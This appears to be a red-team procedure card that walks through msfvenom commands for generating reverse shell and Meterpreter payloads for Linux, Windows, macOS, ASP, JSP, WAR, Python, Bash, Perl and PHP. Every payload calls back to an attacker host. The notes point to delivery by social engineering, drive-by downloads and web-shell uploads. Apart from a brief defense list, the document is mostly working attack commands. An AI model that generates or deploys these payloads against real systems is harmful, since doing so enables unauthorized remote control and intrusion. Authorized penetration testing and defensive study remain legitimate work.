---
id: 056db8af-2511-4782-afca-953c04695f33
name: generate-multi-platform-reverse-shell-payloads
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.941538+00:00'
updated_at: '2023-04-10T20:25:33.085971+00:00'
tactics:
  - '[[tactics/Command-and-Control|TA0011 - Command and Control]]'
  - '[[tactics/Defense-Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Scripting|T1064 - Scripting]]'
  - >-
    [[techniques/Standard-Application-Layer-Protocol|T1071 - Standard
    Application Layer Protocol]]
sub_techniques: []
tags:
  - '[[tags/Meterpreter-Shell]]'
  - '[[tags/Other-platforms]]'
  - '[[tags/Reverse-Shell-Cheat-Sheet]]'
commands:
  - '[[commands/generate-asp-meterpreter-payload]]'
  - '[[commands/generate-bash-reverse-shell-payload]]'
  - '[[commands/generate-java-jsp-reverse-shell-payload]]'
  - '[[commands/generate-java-war-reverse-shell-payload]]'
  - '[[commands/generate-linux-meterpreter-payload]]'
  - '[[commands/generate-osx-reverse-shell-payload]]'
  - '[[commands/generate-perl-reverse-shell-payload]]'
  - '[[commands/generate-php-meterpreter-payload]]'
  - '[[commands/generate-python-reverse-shell-payload]]'
  - '[[commands/generate-windows-meterpreter-payload]]'
platforms:
  - Linux
  - Windows
  - macOS
  - Java
  - PHP
tools:
  - '[[tools/msfvenom]]'
validated: true
---

# Generate Multi-Platform Reverse Shell Payloads

## Summary

This procedure uses msfvenom from the Metasploit Framework to generate reverse shell payloads compatible with multiple operating systems and environments, including Linux, Windows, macOS, Java-based web applications, and scripting languages like Bash, Perl, Python, and PHP. These payloads establish a reverse TCP connection back to the attacker's listener, enabling remote command execution and control during penetration testing or red team engagements.

## Description

Reverse shell payloads are essential for post-exploitation scenarios where initial access has been gained, such as through a vulnerable web application or exploited service. By generating platform-specific payloads, penetration testers can adapt to the target's environment without relying on generic tools that may fail due to compatibility issues. Msfvenom creates encoded, standalone executables or scripts that initiate an outbound connection to a listener (e.g., Metasploit's multi/handler), bypassing inbound firewall restrictions. This procedure covers Meterpreter payloads for advanced sessions (with features like file upload/download and privilege escalation) and basic shell payloads for simpler connections. It assumes the attacker has network access to set up a listener and knowledge of the target's platform. Success results in deployable files that can be transferred to and executed on the target for remote access.

## Requirements

1. Metasploit Framework installed with msfvenom accessible (typically on Kali Linux or similar pentesting distro).
2. Knowledge of the target's platform (e.g., Linux x86, Windows, Java web app) to select appropriate payload.
3. Attacker's IP address ($_LHOST) and listening port ($_LPORT) configured, with a handler ready (e.g., msfconsole multi/handler).
4. Write permissions on the attacker's system to save generated files.
5. Basic networking setup to receive inbound connections from the target.

## Defense

- Implement network segmentation and egress filtering to block unauthorized outbound connections to attacker IPs/ports.
- Use application whitelisting and endpoint detection tools to prevent execution of unknown binaries or scripts (e.g., block ELF/EXE files from untrusted sources).
- Monitor for anomalous processes spawning shells or network activity (e.g., via Sysmon on Windows or auditd on Linux).
- Enable web application firewalls (WAFs) to detect and block payload uploads in formats like JSP, PHP, or WAR.
- Regularly scan for and patch vulnerabilities that allow initial payload delivery (e.g., file upload flaws).

## Objectives

1. Generate platform-specific reverse shell payloads using msfvenom for flexible deployment.
2. Prepare payloads that establish persistent remote access to the target system.
3. Verify payload generation and readiness for transfer and execution on diverse targets.

## Instructions

### Step 1: Generate Linux Meterpreter Payload

**Context**: Create an ELF binary for Linux x86 systems using Meterpreter for advanced post-exploitation capabilities. This step produces a file that can be executed directly on the target to initiate a reverse connection.

**Command** ([[commands/generate-linux-meterpreter-payload]]):
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f elf > shell.elf
```

> This command generates the payload with the specified host and port, saving it as shell.elf. Run it after setting up your listener to ensure immediate connectivity upon target execution. Expected output is a binary file of approximately 3-5 KB; no verbose console output unless errors occur.

### Step 2: Generate Windows Meterpreter Payload

**Context**: Produce an EXE for Windows systems, enabling Meterpreter sessions for command execution, file manipulation, and escalation on the target.

**Command** ([[commands/generate-windows-meterpreter-payload]]):
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f exe > shell.exe
```

> The payload is output to shell.exe, suitable for delivery via social engineering or drive-by downloads. Success is indicated by file creation without encoding errors; size around 30-40 KB.

### Step 3: Generate OSX Reverse Shell Payload

**Context**: Generate a Mach-O binary for macOS x86, providing a basic reverse shell for initial access on Apple systems.

**Command** ([[commands/generate-osx-reverse-shell-payload]]):
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f macho > shell.macho
```

> This creates shell.macho, which can be executed via terminal or bundled in an app. Verify by checking file permissions post-generation; expected size 1-2 KB.

### Step 4: Generate ASP Meterpreter Payload

**Context**: For IIS/ASP environments on Windows, this creates an ASP script for web-based reverse connections without file uploads.

**Command** ([[commands/generate-asp-meterpreter-payload]]):
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f asp > shell.asp
```

> Output is shell.asp, embeddable in web pages. Success: Text file with encoded payload; test by hosting and accessing via browser.

### Step 5: Generate Java JSP Reverse Shell Payload

**Context**: Produce a raw JSP for Java web servers (e.g., Tomcat), allowing RCE via uploaded web shells.

**Command** ([[commands/generate-java-jsp-reverse-shell-payload]]):
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f raw > shell.jsp
```

> Generates shell.jsp for direct upload to web roots. Expected: JSP file with socket code; size under 1 KB.

### Step 6: Generate Java WAR Reverse Shell Payload

**Context**: Create a WAR archive for deploying as a web application, useful for Java EE environments.

**Command** ([[commands/generate-java-war-reverse-shell-payload]]):
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f war > shell.war
```

> Outputs shell.war, deployable via manager apps. Verify archive integrity with unzip; contains JSP payload.

### Step 7: Generate Python Reverse Shell Payload

**Context**: For Unix-like systems with Python, this script-based payload works if Python is available on the target.

**Command** ([[commands/generate-python-reverse-shell-payload]]):
```bash
msfvenom -p cmd/unix/reverse_python LHOST="$_LHOST" LPORT=$_LPORT -f raw > shell.py
```

> Creates shell.py for execution via python shell.py. Success: Python script with socket and subprocess code.

### Step 8: Generate Bash Reverse Shell Payload

**Context**: Simple script for Unix shells, requiring no additional interpreters beyond bash.

**Command** ([[commands/generate-bash-reverse-shell-payload]]):
```bash
msfvenom -p cmd/unix/reverse_bash LHOST="$_LHOST" LPORT=$_LPORT -f raw > shell.sh
```

> Produces shell.sh, executable with bash shell.sh. Expected: One-liner bash code for /bin/bash connection.

### Step 9: Generate Perl Reverse Shell Payload

**Context**: Perl script for systems with Perl installed, useful for legacy Unix environments.

**Command** ([[commands/generate-perl-reverse-shell-payload]]):
```bash
msfvenom -p cmd/unix/reverse_perl LHOST="$_LHOST" LPORT=$_LPORT -f raw > shell.pl
```

> Outputs shell.pl, run with perl shell.pl. Contains socket and exec for shell.

### Step 10: Generate PHP Meterpreter Payload

**Context**: For PHP web environments, this generates and formats a Meterpreter script for web shell deployment.

**Command** ([[commands/generate-php-meterpreter-payload]]):
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

> Creates and prepends <?php to shell.php for valid PHP execution. Success: Formatted PHP file ready for upload.
